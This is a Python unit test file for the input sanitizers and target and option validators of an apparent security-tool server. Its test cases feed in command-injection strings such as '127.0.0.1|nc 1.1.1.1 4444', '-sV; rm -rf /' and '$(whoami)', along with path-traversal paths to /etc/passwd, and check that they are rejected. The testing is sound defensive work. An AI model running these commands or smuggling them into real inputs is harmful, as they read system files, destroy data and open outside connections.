#!/usr/bin/env python3
"""Security-focused sanitization tests."""

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from modules.brain.hexstrike_server import sanitize_input, validate_target, validate_options
from utils.core import validate_ip, validate_hostname, validate_url, sanitize_filename, sanitize_path

class TestSanitization(unittest.TestCase):
    def test_sanitize_input_path_traversal(self):
        self.assertNotIn("..", sanitize_input("../../etc/passwd"))
        self.assertNotIn("//", sanitize_input("//etc/passwd"))

    def test_sanitize_input_leading_dash(self):
        self.assertFalse(sanitize_input("-v").startswith("-"))
        self.assertFalse(sanitize_input("--help").startswith("-"))

    def test_sanitize_input_max_length(self):
        long_input = "a" * 2000
        result = sanitize_input(long_input, max_len=1024)
        self.assertEqual(len(result), 1024)

    def test_validate_target_injection(self):
        for bad in ["127.0.0.1; cat /etc/passwd", "$(whoami)", "`id`", "127.0.0.1|nc 1.1.1.1 4444"]:
            valid, _ = validate_target(bad)
            self.assertFalse(valid, f"Should reject: {bad}")

    def test_validate_options_injection(self):
        for bad in ["-sV; rm -rf /", "-sV|cat /etc/passwd", "$(whoami)", "`id`"]:
            valid, _ = validate_options(bad)
            self.assertFalse(valid, f"Should reject: {bad}")

    def test_validate_ip(self):
        self.assertTrue(validate_ip("192.168.1.1"))
        self.assertTrue(validate_ip("::1"))
        self.assertFalse(validate_ip("not-an-ip"))

    def test_validate_hostname(self):
        self.assertTrue(validate_hostname("example.com"))
        self.assertTrue(validate_hostname("test.sub.example.co.uk"))
        self.assertFalse(validate_hostname(""))
        self.assertFalse(validate_hostname("a" * 300))

    def test_validate_url(self):
        self.assertTrue(validate_url("https://example.com"))
        self.assertTrue(validate_url("http://test.com:8080/path"))
        self.assertFalse(validate_url("not-a-url"))

    def test_sanitize_filename(self):
        self.assertEqual(sanitize_filename("test.txt"), "test.txt")
        self.assertEqual(sanitize_filename("../etc/passwd"), "etcpasswd")
        self.assertEqual(sanitize_filename(""), "unnamed")

    def test_sanitize_path(self):
        self.assertEqual(sanitize_path("/etc/passwd", "/tmp"), "/tmp")
        self.assertEqual(sanitize_path("test.txt", "/tmp"), "/tmp/test.txt")

if __name__ == "__main__":
    unittest.main()
